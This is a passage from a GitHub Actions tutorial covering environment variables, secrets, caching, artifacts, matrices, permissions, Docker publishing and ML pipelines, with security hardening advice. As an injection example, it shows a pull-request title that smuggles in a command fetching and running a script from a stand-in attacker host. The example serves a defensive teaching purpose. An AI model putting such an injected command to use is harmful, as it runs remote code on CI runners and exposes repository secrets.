  Expressions are substituted into your script <em>as text before the shell runs</em>. A pull request titled <code>a"; curl evil.sh | sh; #</code> becomes executable code if you interpolate it directly. Never inline event data into <code>run:</code>. Pass it through <code>env:</code> and quote the variable.
</div>

<div class="guide-compare">
  <div class="guide-compare-col bad">
    <h4>Vulnerable</h4>
    <ul>
      <li><code>run: echo "${{ github.event.pull_request.title }}"</code></li>
      <li><code>run: git commit -m "${{ github.event.issue.body }}"</code></li>
      <li>Any interpolation of <code>head_ref</code>, titles, bodies, or comment text</li>
    </ul>
  </div>
  <div class="guide-compare-col good">
    <h4>Safe</h4>
    <ul>
      <li><code>env:</code> then <code>TITLE: ${{ github.event.pull_request.title }}</code></li>
      <li><code>run: echo "$TITLE"</code> — the shell treats it as data, never as code</li>
      <li>Same rule for <code>actions/github-script</code>: read <code>process.env.TITLE</code></li>
    </ul>
  </div>
</div>

### Expected result or use case

Expressions turn one workflow into many: the same file can deploy to staging from a feature branch and to production from `main` without a single duplicated job.

## 11 Environment Variables

Environment variables are named values that programs and shell commands can read. GitHub automatically provides many of them (`GITHUB_REPOSITORY`, `GITHUB_SHA`, and so on), and you can define your own at workflow, job, or step scope. When the same name is defined at several scopes, the **innermost one wins**.

### Practical example

```yaml scopes, defaults, and dynamic values
env:                                  # ← workflow scope
  APP_NAME: my-app
  LOG_LEVEL: info

jobs:
  build:
    runs-on: ubuntu-latest
    env:                              # ← job scope (overrides above)
      LOG_LEVEL: debug
    steps:
      - name: Step scope
        env:                          # ← step scope (highest priority)
          TARGET: production
        run: echo "$APP_NAME / $LOG_LEVEL / $TARGET"

      - name: Dynamic values
        env:
          SHA_SHORT: ${{ github.sha }}
        run: |
          echo "branch=${GITHUB_REF##*/} sha=${SHA_SHORT:0:7}"

      - name: Set a value for later steps
        run: echo "BUILD_ID=$(date +%s)" >> "$GITHUB_ENV"

      - name: Read it back
        run: echo "build id is $BUILD_ID"

      - name: Show GitHub defaults
        run: |
          echo "repo   = $GITHUB_REPOSITORY"      # owner/repo
          echo "ref    = $GITHUB_REF"             # refs/heads/main
          echo "sha    = $GITHUB_SHA"
          echo "ws     = $GITHUB_WORKSPACE"
          echo "runner = $RUNNER_OS"              # Linux / Windows / macOS
```

### Useful built-in variables

| Variable | Value |
|---|---|
| `GITHUB_REPOSITORY` | `owner/repo` |
| `GITHUB_REF` / `GITHUB_REF_NAME` | `refs/heads/main` / `main` |
| `GITHUB_SHA` | Full commit SHA that triggered the run |
| `GITHUB_WORKSPACE` | Directory the repository is checked out into |
| `GITHUB_EVENT_NAME` | `push`, `pull_request`, `schedule` |
| `GITHUB_RUN_ID` / `GITHUB_RUN_NUMBER` | Unique run id / incrementing counter |
| `RUNNER_OS` / `RUNNER_ARCH` / `RUNNER_TEMP` | Platform, architecture, scratch directory |
| `CI` | Always `true`, which most test tools already detect |

<div class="callout note">
  <span class="ct">env vs expressions inside run blocks</span>
  Prefer plain <code>$VAR_NAME</code> shell syntax inside <code>run:</code>. It avoids YAML quoting problems and removes injection risk entirely. Reserve <code>${{ }}</code> for fields that are not shell scripts, such as <code>if:</code>, <code>with:</code>, and <code>uses:</code>.
</div>

### Expected result or use case

Declaring `env` once at workflow level and overriding only what differs per job keeps a twelve-job pipeline configurable from a five-line block at the top of the file.

## 12 Secrets and Variables

**Secrets** are encrypted values such as API keys, tokens, and passwords. **Variables** are non-sensitive configuration. Both exist at organisation, repository, and environment scope, and the most specific scope wins.

### Where to set them

| Scope | Path in the GitHub UI |
|---|---|
| Repository | Settings → Secrets and variables → Actions |
| Environment | Settings → Environments → *(environment)* → Secrets |
| Organisation | Organisation Settings → Secrets and variables → Actions |

### Adding your first secret

<ol class="guide-steps">
  <li><b>Open repository settings</b>Go to your repository and click <strong>Settings</strong>. You need admin rights on the repository.</li>
  <li><b>Find the Actions secrets page</b>In the left sidebar, under "Security", open <strong>Secrets and variables → Actions</strong>.</li>
  <li><b>Create the secret</b>Click <strong>New repository secret</strong>, choose an uppercase name with underscores such as <code>DEPLOY_KEY</code>, paste the value, and click <strong>Add secret</strong>.</li>
  <li><b>Use it in a workflow</b>Reference it as <code>${{ secrets.DEPLOY_KEY }}</code>, and always pass it through an <code>env:</code> block rather than inlining it in a command.</li>
  <li><b>Rotate, never read</b>After saving, the value can never be displayed again — only updated or deleted. That is expected; workflows still read it perfectly.</li>
</ol>

### Practical example

```yaml using secrets and variables
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production          # unlocks environment-scoped secrets
    steps:
      - name: Deploy to cloud
        run: ./deploy.sh
        env:                         # secrets always via env, masked in logs
          AWS_KEY:    ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          REGION:     ${{ vars.AWS_REGION }}        # non-secret config

      - name: Log in to a registry
        run: echo "$DOCKER_PW" | docker login -u "$DOCKER_USER" --password-stdin
        env:
          DOCKER_USER: ${{ vars.DOCKER_USER }}
          DOCKER_PW: ${{ secrets.DOCKER_PW }}

      - name: Use the built-in token
        run: gh release create v1.0 dist/*
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}     # created per run
```

### The automatic GITHUB_TOKEN

```yaml GITHUB_TOKEN and permissions
# a token is injected into every job as secrets.GITHUB_TOKEN / github.token
# it expires when the run ends; scope it down explicitly:
permissions:
  contents: read          # read the repository
  pull-requests: write    # for example, comment on pull requests

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}
```

<div class="callout warn">
  <span class="ct">Secret rules worth memorising</span>
  Secrets are masked in logs, but anyone who can push a workflow to the repository can print them to an external service — treat them as visible to everyone with write access. They are <strong>not</strong> passed to workflows triggered from forks, which is precisely why <code>pull_request_target</code> is dangerous. Secret names cannot start with <code>GITHUB_</code>, and multi-line secrets are only masked line by line.
</div>

### Expected result or use case

Environment-scoped secrets mean the production database password simply does not exist in a pull-request run, so a malicious or careless change cannot reach it.

## 13 Caching Dependencies

Because every job starts on a fresh machine (section 09), dependencies are downloaded from scratch on *every single run*, which is often the slowest part of a build. **Caching** fixes this: one run saves the downloaded packages and later runs restore them in seconds. A four-minute install can drop to a few seconds, and on private repositories that directly reduces billed minutes.

### The easy way

```yaml built-in caching in the setup actions
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: npm                        # caches ~/.npm automatically

- uses: actions/setup-python@v5
  with:
    python-version: '3.12'
    cache: pip                        # caches ~/.cache/pip

- uses: actions/setup-java@v4
  with:
    java-version: '21'
    distribution: temurin
    cache: gradle                     # caches ~/.gradle
```

### The generic way

```yaml actions/cache with restore-keys
- name: Cache node modules
  id: npm-cache
  uses: actions/cache@v4
  with:
    path: |
      ~/.npm
      node_modules
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |                   # fallback prefix matching
      npm-${{ runner.os }}-
      npm-

- name: Install only when the cache missed
  if: steps.npm-cache.outputs.cache-hit != 'true'
  run: npm ci
```

### How the key works

| Situation | Result |
|---|---|
| Exact `key` match | Restored fully, `cache-hit` output is `'true'`, nothing re-saved |
| Only a `restore-keys` prefix matches | Partial restore, then saved under the new exact key at job end |
| Nothing matches | Empty start, saved under the exact key at job end |

`hashFiles('**/package-lock.json')` makes the key change whenever a lockfile changes, so you get fresh dependencies automatically after an update and reuse them for every run in between.

<div class="callout tip">
  <span class="ct">Cache limits and scoping</span>
  Ten gigabytes per repository, with the oldest unused entries evicted first. Caches are branch-scoped: a pull request can read caches from its own branch and from the default branch, but the default branch cannot read a pull request's caches. That is why the first run on a new branch is always slower.
</div>

<div class="callout warn">
  <span class="ct">Never cache the wrong thing</span>
  Do not cache build output that must be rebuilt (<code>dist/</code>, <code>.next/</code> without a proper key), and never cache credentials or a whole <code>~</code> directory. If a cached directory can make a broken build look green, key it on the inputs that produce it or do not cache it at all.
</div>

### Expected result or use case

On a typical Node repository, `cache: npm` plus a lockfile-hashed key turns a ninety-second install into a five-second restore, which is usually the single biggest CI speed-up available.

## 14 Artifacts

Because each job runs on its own machine, files do not carry over between jobs by default. **Artifacts** are GitHub's built-in file-sharing system: one job uploads files such as a build, a coverage report, or binaries, another job downloads them, and you can also grab them yourself from the run page. Unlike caches, artifacts are deliverables meant for people or later jobs, and they expire after ninety days by default.

### Practical example

```yaml build → upload → download → deploy
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: dist-${{ github.sha }}     # artifact name
          path: |
            dist/
            coverage/
          retention-days: 7                # override the default 90
          if-no-files-found: error         # fail loudly instead of silently

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist-${{ github.sha }}
          path: download/
      - run: ls download/dist && ./deploy.sh download/dist
```

### Collecting artifacts from a matrix

```yaml merge many matrix artifacts into one
jobs:
  test:
    strategy:
      matrix:
        shard: [1, 2, 3, 4]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test -- --shard=${{ matrix.shard }}/4
      - uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.shard }}   # unique name per shard
          path: coverage/

  report:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          pattern: coverage-*                 # download all of them
          merge-multiple: true
          path: coverage/
      - run: npx nyc report --reporter=text-summary
```

<div class="callout note">
  <span class="ct">Cache or artifact?</span>
  <strong>Cache</strong> is a machine-to-machine speed-up for package managers: keyed, restored automatically, invisible in the UI, and safe to lose. <strong>Artifact</strong> is a deliverable output such as a binary, a coverage report, or a trained model: named explicitly, listed on the run summary page, and downloadable by humans.
</div>

<div class="callout warn">
  <span class="ct">Artifacts are not private</span>
  On a public repository anyone can download your artifacts. Never upload <code>.env</code> files, service-account keys, or raw logs that may contain tokens, and prefer narrow <code>path:</code> patterns over uploading a whole directory.
</div>

### Expected result or use case

A build job that uploads `dist/` once and a deploy job that downloads it guarantees you ship the exact bytes that were tested, instead of rebuilding and hoping the result is identical.

## 15 Matrix Builds

Does your library work on Linux, Windows, and macOS? On Node 18, 20, and 22? A **matrix** runs the same job once per **combination** of values: you write the job once and GitHub multiplies it out. In the example below three operating systems times three Node versions is nine combinations, minus one exclusion, plus one extra `include` entry, which produces nine jobs shown as separate cards on the run page.

### Practical example

```yaml cross-platform, multi-version matrix
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false                  # one failure does not cancel the rest
      max-parallel: 4                   # run at most four at once
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [18, 20, 22]
        exclude:                        # drop specific combinations
          - os: macos-latest
            node: 18
        include:                        # add extra one-off configurations
          - os: ubuntu-latest
            node: 20
            experimental: true
    name: Test (Node ${{ matrix.node }} on ${{ matrix.os }})
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test
        continue-on-error: ${{ matrix.experimental == true }}
```

### Dynamic matrices

A matrix can be generated at run time from a previous job's output, which is how monorepos test only the packages that changed:

```yaml matrix expansion via fromJSON
jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.set.outputs.packages }}
    steps:
      - uses: actions/checkout@v4
      - id: set
        run: |
          dirs=$(ls -d packages/*/ | jq -Rsc 'split("\n")[:-1]')
          echo "packages=$dirs" >> "$GITHUB_OUTPUT"

  build:
    needs: discover
    runs-on: ubuntu-latest
    strategy:
      matrix:
        package: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@v4
      - run: npm run build --workspace "${{ matrix.package }}"
```

<div class="callout warn">
  <span class="ct">Matrix limits and cost</span>
  A single matrix may expand to at most <strong>256 jobs</strong>. Remember that cost multiplies too: a nine-way matrix on a private repository burns nine times the minutes, and macOS entries are billed at ten times the Linux rate. Run the full matrix on <code>main</code> and a two-entry smoke matrix on pull requests.
</div>

### Expected result or use case

Matrices turn "it works on my machine" into a claim you can prove. They are also the fastest way to shard a slow test suite: one axis, four shards, a quarter of the wall-clock time.

## 16 Service Containers

Integration tests usually need a real database, cache, or message broker running somewhere. **Service containers** are extra Docker containers GitHub starts *next to* your job, already networked together. Your steps simply connect to `localhost` on the mapped port, as if the database were installed on the same machine. Health-check options make the job wait until the service is genuinely ready before tests start.

### Practical example

```yaml Postgres and Redis services for integration tests
jobs:
  integration:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: app
          POSTGRES_PASSWORD: secret
          POSTGRES_DB: testdb
        ports:
          - 5432:5432                  # host:container
        options: >-
          --health-cmd "pg_isready -U app"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10          # wait until healthy before steps run

      redis:
        image: redis:7
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s
          --health-retries 10

    steps:
      - uses: actions/checkout@v4
      - name: Run integration tests
        env:
          DATABASE_URL: postgres://app:secret@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379
        run: |
          npm ci
          npm run test:integration
```

<div class="callout note">
  <span class="ct">Two details that cause most service failures</span>
  Service containers only work on <strong>Linux runners</strong>. And when your job itself runs inside a <code>container:</code>, you address services by their <em>label</em> (<code>postgres:5432</code>) rather than <code>localhost</code>, because both live on the same Docker network. Without a health check your tests will race the database and fail intermittently.
</div>

### Expected result or use case

Real services in CI mean your integration tests exercise the same SQL, the same driver, and the same connection handling as production, instead of a mock that quietly diverges over time.

## 17 Reusable Workflows

Call one workflow from another to define your organisation's standard CI once and reuse it across many repositories. The called workflow declares `workflow_call` with typed inputs and explicitly named secrets.

### Practical example

```yaml .github/workflows/node-ci.yml — the reusable template
on:
  workflow_call:
    inputs:
      node-version:
        required: true
        type: string
      run-lint:
        required: false
        type: boolean
        default: true
    secrets:
      deploy-token:                    # secrets must be declared to be passed
        required: false
    outputs:
      version:
        description: 'The version that was built'
        value: ${{ jobs.ci.outputs.version }}

jobs:
  ci:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.meta.outputs.version }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}
      - run: npm ci
      - if: ${{ inputs.run-lint }}
        run: npm run lint
      - run: npm test
      - id: meta
        run: echo "version=$(node -p 'require(\"./package.json\").version')" >> "$GITHUB_OUTPUT"
```

```yaml .github/workflows/main.yml — the caller
on: [push]

jobs:
  call-standard-ci:
    uses: my-org/shared-workflows/.github/workflows/node-ci.yml@v2
    with:
      node-version: '20'
      run-lint: true
    secrets:
      deploy-token: ${{ secrets.DEPLOY_TOKEN }}
    permissions:
      contents: read

  use-the-result:
    needs: call-standard-ci
    runs-on: ubuntu-latest
    steps:
      - run: echo "built ${{ needs.call-standard-ci.outputs.version }}"
```

### Reusable workflow or composite action?

| | Reusable workflow | Composite action |
|---|---|---|
| Unit of reuse | Whole jobs, including `runs-on` and `needs` | A sequence of steps inside someone else's job |
| Referenced by | `uses:` at the **job** level | `uses:` at the **step** level |
| Can define a matrix | Yes | No |
| Can use secrets | Yes, declared explicitly | Only what the caller passes as inputs |
| Best for | Organisation-wide CI policy | "Set up our toolchain" step bundles |

<div class="callout tip">
  <span class="ct">Why bother?</span>
  One source of truth for organisation-wide CI policy, updates that ship everywhere by bumping a tag, and no copy-paste drift between repositories. Limits to know: nesting is capped at four levels, and a single run tree may reference at most twenty unique reusable workflows.
</div>

### Expected result or use case

Twenty repositories calling `node-ci.yml@v2` all gain a new security scan the moment you tag `v2.1`, without twenty pull requests.

## 18 Environments and Approvals

An **environment** is a named deployment target such as `staging` or `production`, configured under Settings → Environments. Each environment carries its own secrets and **protection rules**: required reviewers, branch restrictions, and wait timers. A job opts in with a single `environment:` line, and everything else is enforced by GitHub rather than by your YAML.

### Creating an environment

<ol class="guide-steps">
  <li><b>Open the environments page</b>Repository <strong>Settings → Environments → New environment</strong>.</li>
  <li><b>Name it</b>Use a name that matches how your team talks: <code>staging</code>, <code>production</code>, <code>pypi</code>.</li>
  <li><b>Add required reviewers</b>The listed people must click "Review deployments" and approve before any job using this environment starts. A configurable timeout auto-denies.</li>
  <li><b>Restrict deployment branches</b>Allow only <code>main</code>, only protected branches, or a pattern such as <code>releases/**</code>, so a feature branch can never deploy to production.</li>
  <li><b>Add environment secrets</b>Production credentials live here and nowhere else, so they simply do not exist in other runs.</li>
</ol>

### Practical example

```yaml .github/workflows/deploy.yml — gated production deploy
name: Deploy

on:
  push:
    branches: [main]

concurrency:
  group: production-deploy
  cancel-in-progress: false          # never cancel a deploy midway

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:                     # ← the job PAUSES here until approved
      name: production
      url: https://app.example.com   # shows a clickable link on the run page

    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        run: ./scripts/deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.PROD_DEPLOY_KEY }}   # environment-scoped

  smoke-test:
    needs: deploy
    runs-on: ubuntu-latest
    steps:
      - run: curl --fail --retry 5 --retry-delay 10 https://app.example.com/healthz

  rollback:
    needs: smoke-test
    if: failure()
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: ./scripts/rollback.sh
```

### Protection rules you can enable

- **Required reviewers** — the job waits until an authorised user approves it in the run's UI.
- **Deployment branches and tags** — an allow-list, so only `main` or `releases/**` may deploy.
- **Wait timer** — delay N minutes before the job starts, useful as a change-window buffer.
- **Environment secrets and variables** — credentials scoped so tightly that a leak elsewhere cannot use them.

### Expected result or use case

`environment: production` plus one required reviewer converts "anyone who can merge can deploy" into an auditable two-person process, without adding a single line of scripting.

## 19 Concurrency and Run Control

By default GitHub happily runs ten stacked pipelines for ten quick pushes, and two deploys of different commits at the same time. **Concurrency groups** fix both problems: runs in the same group are serialized, and `cancel-in-progress` decides whether the newcomer waits or supersedes.

### Practical example

```yaml concurrency patterns worth copying
# ① CI: supersede stale runs on the same branch or pull request
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# ② Deploys: queue them, never cancel a half-finished release
# concurrency:
#   group: deploy-production
#   cancel-in-progress: false

# ③ Per-environment queues in a matrix-driven deploy
# jobs:
#   deploy:
#     concurrency:
#       group: deploy-${{ matrix.environment }}
#       cancel-in-progress: false
```

### The full run-control toolbox

| Control | Scope | Why it matters |
|---|---|---|
| `concurrency.cancel-in-progress: true` | Workflow or job | Stops five pushes in a minute from burning five full pipelines |
| `timeout-minutes` | Job and step | Default is **360 minutes**; a hung step otherwise burns six hours of quota |
| `continue-on-error` | Job and step | Marks a flaky or advisory check as non-blocking |
| `fail-fast: false` | Matrix | Shows every failing combination instead of only the first |
| `if: github.event.pull_request.draft == false` | Job | Skips heavy work while a pull request is still a draft |
| `paths-ignore` | Event | Prevents documentation-only commits from triggering builds |
| `github.run_attempt` | Expression | Lets a re-run behave differently, for example skipping cached steps |

<div class="callout tip">
  <span class="ct">Set these three lines in every workflow</span>
  A concurrency group keyed on <code>github.ref</code>, <code>timeout-minutes</code> on every job, and explicit <code>permissions</code>. Together they cost three lines and prevent the three most common ways a repository wastes minutes or gets stuck.
</div>

### Expected result or use case

On an active repository, cancel-in-progress typically removes twenty to forty percent of total minutes because most runs are superseded before they ever mattered.

## 20 Permissions and Supply Chain Security

Every run receives an automatic `GITHUB_TOKEN` that expires when the run ends. Its default scope may be read/write for the whole repository, which means a compromised third-party action inherits the ability to push code. Locking this down, and pinning what you execute, is the highest-value security work in CI.

### Least-privilege permissions

```yaml permissions — deny by default, grant per job
permissions: {}                       # workflow default: nothing at all

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read                  # just enough to check out
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  comment:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write            # only this job may comment
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: 'Tests passed.'
            })
```

| Scope | Grants |
|---|---|
| `contents` | Read or write repository files, branches, tags, and releases |
| `pull-requests` | Comment on, label, and update pull requests |
| `issues` | Comment on and label issues |
| `packages` | Push and pull from GitHub Packages and GHCR |
| `id-token` | Request an OIDC token for keyless cloud authentication |
| `attestations` | Publish build provenance attestations |
| `actions` | Manage workflow runs and caches |
| `security-events` | Upload CodeQL and scanning results |

### Keyless cloud authentication with OIDC

Long-lived cloud keys stored as secrets are the most common source of serious CI incidents. OIDC replaces them: the runner requests a short-lived signed token and the cloud provider exchanges it for temporary credentials scoped to your repository and branch.

```yaml OIDC — deploy to AWS with no stored keys
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write                 # required to request the OIDC token
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: eu-west-1
          # no AWS_ACCESS_KEY_ID, no AWS_SECRET_ACCESS_KEY anywhere
      - run: aws s3 sync ./dist s3://my-bucket --delete
```

### Hardening checklist

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Do</h4>
    <ul>
      <li>Pin third-party actions by full commit SHA with the version in a comment</li>
      <li>Start from <code>permissions: {}</code> and grant per job</li>
      <li>Use OIDC instead of stored cloud keys wherever the provider supports it</li>
      <li>Pass untrusted event data through <code>env:</code>, never into <code>run:</code></li>
      <li>Enable Dependabot for the <code>github-actions</code> ecosystem</li>
      <li>Publish provenance with <code>actions/attest-build-provenance</code> for released artifacts</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>Do not</h4>
    <ul>
      <li>Reference actions by a moving branch such as <code>@main</code></li>
      <li>Use <code>pull_request_target</code> to check out and run fork code</li>
      <li>Attach self-hosted runners to public repositories</li>
      <li>Echo secrets, or upload logs and <code>.env</code> files as artifacts</li>
      <li>Grant <code>contents: write</code> to a job that only needs to read</li>
      <li>Leave <code>timeout-minutes</code> unset on jobs that talk to the network</li>
    </ul>
  </div>
</div>

<div class="callout warn">
  <span class="ct">The pull_request_target trap</span>
  <code>pull_request_target</code> runs in the <em>base</em> repository's context, with secrets and a write-capable token, but the pull request's code is untrusted. If you check out <code>github.event.pull_request.head.sha</code> and then run its build scripts, a fork can exfiltrate every secret you have. Use it only for metadata work such as labelling, never to execute the contributor's code.
</div>

### Expected result or use case

A workflow that starts with `permissions: {}`, pins every third-party action by SHA, and authenticates to the cloud with OIDC has no long-lived credentials to steal and no implicit write access to abuse.

## 21 Docker in GitHub Actions

Build, scan, and push container images either with raw `docker build` or with the login/metadata/build-push trio that tags images the conventional way. Combined with BuildKit's GitHub Actions cache backend, image builds become nearly as fast as local ones.

### Practical example

```yaml .github/workflows/docker.yml — build, tag, scan, push
name: Docker Publish

on:
  push:
    branches: [main]
    tags: ['v*.*.*']

env:
  REGISTRY: ghcr.io
  IMAGE: ${{ github.repository }}      # owner/repo

jobs:
  build-push:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write                  # needed to push to GHCR
      id-token: write                  # for provenance attestation
      attestations: write

    steps:
      - uses: actions/checkout@v4

      - uses: docker/setup-qemu-action@v3          # for multi-arch builds
      - uses: docker/setup-buildx-action@v3        # the BuildKit builder

      - uses: docker/login-action@v3               # authenticate
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - id: meta                                   # conventional tags + labels
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE }}
          tags: |
            type=ref,event=branch                  # main
            type=semver,pattern={{version}}        # v1.2.3 → 1.2.3
            type=semver,pattern={{major}}.{{minor}}
            type=sha,format=long                   # sha-abc1234...

      - id: build
        uses: docker/build-push-action@v6
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: ${{ github.event_name != 'pull_request' }}
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha                     # reuse BuildKit layers
          cache-to: type=gha,mode=max

      - name: Scan the image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE }}:sha-${{ github.sha }}
          severity: HIGH,CRITICAL
          exit-code: '1'

      - uses: actions/attest-build-provenance@v1
        if: github.event_name != 'pull_request'
        with:
          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
```

### Targeting a sub-directory or a build stage

```yaml building a Dockerfile in another folder
- uses: docker/build-push-action@v6
  with:
    context: ./backend
    file: ./backend/Dockerfile.prod
    build-args: |
      VERSION=${{ github.sha }}
    target: production          # a stage in a multi-stage Dockerfile
    secrets: |
      npm_token=${{ secrets.NPM_TOKEN }}   # BuildKit secret, never a layer
```

<div class="callout tip">
  <span class="ct">Pair this with the Docker guide</span>
  <code>cache-from: type=gha</code> only helps if your Dockerfile is ordered so dependency layers come before source layers. The multi-stage builds, layer-cache, and image-optimisation sections of the Docker guide on this site cover exactly how to structure that.
</div>

### Expected result or use case

Every merge to `main` publishes a scanned, multi-architecture, provenance-signed image tagged with both the branch and the commit SHA, so a rollback is a tag change rather than a rebuild.

## 22 Creating Custom Actions

When the same five steps appear in six workflows, package them as an action. There are three flavours.

| Type | How | Best for |
|---|---|---|
| **Composite** | A YAML `action.yml` containing steps | Wrapping script sequences. Simplest, and the right default |
| **JavaScript** | `index.js` using `@actions/core` | Cross-platform logic, fastest startup, real error handling |
| **Docker** | A `Dockerfile` that runs in a container | Exact toolchain pinning, any language. Linux only |

### Practical example

```yaml .github/actions/setup-project/action.yml — composite action
name: 'Setup project'
description: 'Checks out, installs Node, restores the cache, and reports size'

inputs:
  node-version:
    description: 'Node major version'
    required: false
    default: '20'
outputs:
  file-count:
    description: 'Number of files in the repository'
    value: ${{ steps.count.outputs.count }}

runs:
  using: composite
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: npm

    - shell: bash
      run: npm ci

    - id: count
      shell: bash
      run: echo "count=$(git ls-files | wc -l)" >> "$GITHUB_OUTPUT"
```

```yaml using your own action
jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4      # required before a local action
      - id: setup
        uses: ./.github/actions/setup-project
        with:
          node-version: '22'
      - run: echo "${{ steps.setup.outputs.file-count }} files tracked"
```

### A JavaScript action

```yaml action.yml for a JavaScript action
name: 'Wait and report'
description: 'Sleeps, then reports how long it waited'
inputs:
  milliseconds:
    description: 'How long to wait'
    required: true
    default: '1000'
outputs:
  result:
    description: 'What the action produced'
runs:
  using: node20
  main: dist/index.js
```

```javascript index.js — bundle it with esbuild or ncc before committing
const core = require('@actions/core')

async function run() {
  const ms = Number(core.getInput('milliseconds'))
  core.debug(`waiting ${ms} ms`)
  await new Promise((resolve) => setTimeout(resolve, ms))
  core.setOutput('result', `waited ${ms}`)
  core.summary.addHeading('Wait complete').addRaw(`Waited ${ms} ms`).write()
}

run().catch((error) => core.setFailed(error.message))
```

<div class="callout note">
  <span class="ct">Two rules for composite actions</span>
  Every <code>run</code> step inside a composite action must declare its own <code>shell:</code>, and a composite action cannot use <code>if:</code> at the action level or reference <code>secrets</code> directly — pass what it needs in as inputs.
</div>

### Expected result or use case

A single `setup-project` composite action replaces fifteen lines of boilerplate at the top of every job, and improving the cache strategy once improves it everywhere.

## 23 CI/CD for Machine Learning Projects

ML repositories break normal CI assumptions: datasets are too large to check out, training takes hours, GPUs are not available on hosted runners, and "correct" is a metric threshold rather than a passing assertion. The fix is not a different tool, it is a different division of labour between fast and slow workflows.

### What runs where

| Concern | Where it belongs | Why |
|---|---|---|
| Lint, type check, unit tests on code | Hosted runner, on every pull request | Seconds, and catches most regressions |
| Data schema and quality validation | Hosted runner, on a small sampled fixture | Deterministic and cheap |
| Fast smoke training on a tiny subset | Hosted runner, on every pull request | Proves the training script still runs end to end |
| Full training | Self-hosted GPU runner or a cloud job the workflow triggers | Hosted runners have no GPU and a six-hour cap |
| Model evaluation gate | Wherever training ran | The metric threshold is the real test |
| Image build and model packaging | Hosted runner, on merge to `main` | Reproducible, cached, signed |

### Practical example

```yaml .github/workflows/ml-ci.yml — fast checks plus a training gate
name: ML CI

on:
  pull_request:
  push:
    branches: [main]

concurrency:
  group: ml-ci-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

jobs:
  code-quality:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
          cache: pip
      - run: pip install -e ".[dev]"
      - run: ruff check .
      - run: mypy src
      - run: pytest tests/unit -q

  data-validation:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
          cache: pip
      - run: pip install -e ".[dev]"
      - name: Validate the sampled fixture against the schema
        run: python -m src.data.validate --input tests/fixtures/sample.parquet
      - name: Publish a data report on the run summary
        run: |
          {
            echo "### Data validation"
            python -m src.data.report --input tests/fixtures/sample.parquet
          } >> "$GITHUB_STEP_SUMMARY"

  smoke-train:
    needs: [code-quality, data-validation]
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
          cache: pip
      - run: pip install -e ".[dev]"
      - name: Train on 1% of the data for one epoch
        run: python -m src.train --config configs/ci-smoke.yaml
